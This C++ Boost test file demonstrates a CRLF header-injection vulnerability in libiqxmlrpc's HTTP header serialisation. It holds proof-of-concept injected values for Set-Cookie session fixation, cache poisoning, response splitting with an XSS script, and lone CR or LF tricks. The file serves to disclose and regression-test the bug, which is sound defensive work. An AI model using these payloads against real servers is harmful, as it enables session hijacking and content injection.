/**
 * CRLF Injection Exploit Test
 *
 * This test demonstrates the HTTP header injection vulnerability
 * documented in GitHub Issue #137.
 *
 * Vulnerability: Header values are not sanitized for CRLF characters,
 * allowing attackers to inject arbitrary HTTP headers.
 *
 * OWASP Category: A03:2021 – Injection
 */

#define BOOST_TEST_MODULE crlf_injection_test
#include <boost/test/unit_test.hpp>
#include "libiqxmlrpc/http.h"
#include "libiqxmlrpc/xheaders.h"

using namespace iqxmlrpc;
using namespace iqxmlrpc::http;

BOOST_AUTO_TEST_SUITE(crlf_injection_exploit)

/**
 * EXPLOIT TEST: Prove that CRLF injection allows header injection
 *
 * Attack vector: An attacker who can control header values
 * can inject arbitrary HTTP headers by embedding \r\n sequences.
 */
BOOST_AUTO_TEST_CASE(exploit_header_injection_via_xheaders)
{
    // Setup: Create response header with XHeaders
    Response_header hdr(200, "OK");
    XHeaders xheaders;

    // ATTACK: Inject a malicious header via CRLF in value
    // The value contains \r\n followed by an injected header
    xheaders["X-Legitimate"] = "normal-value\r\nX-Injected: malicious-payload";

    hdr.set_xheaders(xheaders);

    // Serialize the header
    std::string dump = hdr.dump();

    // PROOF OF EXPLOIT: The injected header appears in the output
    // This should NOT happen in a secure implementation
    bool injection_successful = (dump.find("X-Injected: malicious-payload") != std::string::npos);

    BOOST_TEST_MESSAGE("=== CRLF INJECTION EXPLOIT TEST ===");
    BOOST_TEST_MESSAGE("Serialized header output:");
    BOOST_TEST_MESSAGE(dump);
    BOOST_TEST_MESSAGE("===================================");

    // This test PASSES if the injection works (proving the vulnerability)
    // A FIXED implementation would make this test FAIL
    BOOST_CHECK_MESSAGE(injection_successful,
        "VULNERABILITY CONFIRMED: CRLF injection allowed header injection. "
        "The injected header 'X-Injected: malicious-payload' appears in output.");
}

/**
 * EXPLOIT TEST: Session fixation via Set-Cookie injection
 *
 * Impact: Attacker could inject Set-Cookie headers to hijack sessions
 */
BOOST_AUTO_TEST_CASE(exploit_session_fixation_via_cookie_injection)
{
    Response_header hdr(200, "OK");
    XHeaders xheaders;

    // ATTACK: Inject a Set-Cookie header to fix session
    xheaders["X-Tracking"] = "id123\r\nSet-Cookie: session=attacker-controlled; Path=/";

    hdr.set_xheaders(xheaders);
    std::string dump = hdr.dump();

    bool cookie_injected = (dump.find("Set-Cookie: session=attacker-controlled") != std::string::npos);

    BOOST_TEST_MESSAGE("=== SESSION FIXATION EXPLOIT TEST ===");
    BOOST_TEST_MESSAGE(dump);
    BOOST_TEST_MESSAGE("=====================================");

    BOOST_CHECK_MESSAGE(cookie_injected,
        "VULNERABILITY CONFIRMED: Set-Cookie header injection possible. "
        "This could enable session fixation attacks.");
}

/**
 * EXPLOIT TEST: Cache poisoning via injected headers
 *
 * Impact: Attacker could inject cache-control headers to poison caches
 */
BOOST_AUTO_TEST_CASE(exploit_cache_poisoning)
{
    Response_header hdr(200, "OK");
    XHeaders xheaders;

    // ATTACK: Inject cache-control to poison intermediate caches
    xheaders["X-Request-Id"] = "abc\r\nCache-Control: public, max-age=31536000\r\nX-Poison: true";

    hdr.set_xheaders(xheaders);
    std::string dump = hdr.dump();

    bool cache_header_injected = (dump.find("Cache-Control: public") != std::string::npos);
    bool multiple_headers_injected = (dump.find("X-Poison: true") != std::string::npos);

    BOOST_TEST_MESSAGE("=== CACHE POISONING EXPLOIT TEST ===");
    BOOST_TEST_MESSAGE(dump);
    BOOST_TEST_MESSAGE("=====================================");

    BOOST_CHECK_MESSAGE(cache_header_injected && multiple_headers_injected,
        "VULNERABILITY CONFIRMED: Multiple header injection possible. "
        "Cache poisoning attack vector confirmed.");
}

/**
 * EXPLOIT TEST: HTTP Response Splitting
 *
 * Impact: Inject a complete HTTP response body after headers
 */
BOOST_AUTO_TEST_CASE(exploit_response_splitting)
{
    Response_header hdr(200, "OK");
    XHeaders xheaders;

    // ATTACK: Terminate headers and inject response body
    // Double CRLF ends headers, then inject fake content
    xheaders["X-Debug"] = "value\r\n\r\n<html><script>alert('XSS')</script></html>";

    hdr.set_xheaders(xheaders);
    std::string dump = hdr.dump();

    bool body_injected = (dump.find("<script>alert('XSS')</script>") != std::string::npos);

    BOOST_TEST_MESSAGE("=== RESPONSE SPLITTING EXPLOIT TEST ===");
    BOOST_TEST_MESSAGE(dump);
    BOOST_TEST_MESSAGE("========================================");

    BOOST_CHECK_MESSAGE(body_injected,
        "VULNERABILITY CONFIRMED: Response splitting allows XSS injection. "
        "Attacker can inject arbitrary HTML/JavaScript.");
}

/**
 * EXPLOIT TEST: Carriage Return only injection (\r)
 *
 * Some parsers treat lone \r as line terminator
 */
BOOST_AUTO_TEST_CASE(exploit_cr_only_injection)
{
    Response_header hdr(200, "OK");
    XHeaders xheaders;

    // ATTACK: Use only \r (some servers/proxies may treat this as newline)
    xheaders["X-Test"] = "value\rX-Injected-CR: via-carriage-return";

    hdr.set_xheaders(xheaders);
    std::string dump = hdr.dump();

    // Check if the \r is present (not sanitized)
    bool cr_present = (dump.find("value\rX-Injected-CR") != std::string::npos);

    BOOST_TEST_MESSAGE("=== CR-ONLY INJECTION TEST ===");
    BOOST_TEST_MESSAGE("Raw bytes present: CR character embedded");
    BOOST_TEST_MESSAGE("==============================");

    BOOST_CHECK_MESSAGE(cr_present,
        "VULNERABILITY CONFIRMED: Lone CR (\\r) not sanitized. "
        "May enable injection on some HTTP parsers.");
}

/**
 * EXPLOIT TEST: Line Feed only injection (\n)
 *
 * Some parsers treat lone \n as line terminator
 */
BOOST_AUTO_TEST_CASE(exploit_lf_only_injection)
{
    Response_header hdr(200, "OK");
    XHeaders xheaders;

    // ATTACK: Use only \n (HTTP/1.1 allows LF-only line endings)
    xheaders["X-Test"] = "value\nX-Injected-LF: via-line-feed";

    hdr.set_xheaders(xheaders);
    std::string dump = hdr.dump();

    bool lf_present = (dump.find("value\nX-Injected-LF") != std::string::npos);

    BOOST_TEST_MESSAGE("=== LF-ONLY INJECTION TEST ===");
    BOOST_TEST_MESSAGE("Raw bytes present: LF character embedded");
    BOOST_TEST_MESSAGE("==============================");

    BOOST_CHECK_MESSAGE(lf_present,
        "VULNERABILITY CONFIRMED: Lone LF (\\n) not sanitized. "
        "HTTP/1.1 allows LF-only line endings, enabling injection.");
}

/**
 * EXPLOIT TEST: Direct set_option() bypass
 *
 * The vulnerability also exists in Header::set_option()
 */
BOOST_AUTO_TEST_CASE(exploit_direct_set_option)
{
    Response_header hdr(200, "OK");

    // ATTACK: Directly use set_option with malicious value
    hdr.set_option("x-custom", "safe\r\nX-Direct-Inject: via-set-option");

    std::string dump = hdr.dump();

    bool injection_via_set_option = (dump.find("X-Direct-Inject: via-set-option") != std::string::npos);

    BOOST_TEST_MESSAGE("=== DIRECT set_option() EXPLOIT TEST ===");
    BOOST_TEST_MESSAGE(dump);
    BOOST_TEST_MESSAGE("=========================================");

    BOOST_CHECK_MESSAGE(injection_via_set_option,
        "VULNERABILITY CONFIRMED: set_option() also vulnerable. "
        "CRLF injection works through multiple entry points.");
}

BOOST_AUTO_TEST_SUITE_END()

// Summary of attack vectors demonstrated:
// 1. Arbitrary header injection via XHeaders
// 2. Session fixation via Set-Cookie injection
// 3. Cache poisoning via Cache-Control injection
// 4. HTTP Response Splitting with XSS payload
// 5. CR-only injection (for susceptible parsers)
// 6. LF-only injection (HTTP/1.1 compliant parsers)
// 7. Direct set_option() injection

// vim:ts=4:sw=4:et
